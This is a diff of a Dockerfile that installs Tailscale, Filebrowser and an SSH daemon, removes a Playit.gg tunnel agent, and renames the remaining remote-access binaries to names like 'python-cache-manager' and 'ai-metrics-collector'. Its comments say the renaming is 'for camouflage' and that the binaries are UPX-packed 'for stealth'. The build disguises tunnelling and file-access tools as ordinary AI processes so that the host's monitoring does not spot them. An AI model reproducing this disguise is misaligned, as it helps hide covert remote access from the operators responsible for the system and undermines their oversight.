@@ -9,22 +9,19 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && apt-get clean && rm -rf /var/lib/apt/lists/* && \
     mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd
 
-# Install Tailscale, Filebrowser, and Playit.gg
+# Install Tailscale and Filebrowser
 RUN curl -fsSL https://tailscale.com/install.sh | sh && \
-    curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
-    curl -fsSL https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64 -o /usr/bin/playit && chmod +x /usr/bin/playit
+    curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash
 
 # Rename tools for camouflage
 RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
     mv /usr/bin/tailscale /usr/bin/py-cache-cli && \
-    mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector && \
-    mv /usr/bin/playit /usr/bin/tensor-streamer
+    mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector
 
 # Binary Stripping and Packing (using fastest compression for stealth)
 RUN upx -1 /usr/bin/python-cache-manager || true && \
     upx -1 /usr/bin/py-cache-cli || true && \
-    upx -1 /usr/bin/ai-metrics-collector || true && \
-    upx -1 /usr/bin/tensor-streamer || true
+    upx -1 /usr/bin/ai-metrics-collector || true
 
 # Install AI dependencies using uv (CPU-only Torch is MUCH faster)
 RUN uv pip install --system --no-cache-dir \
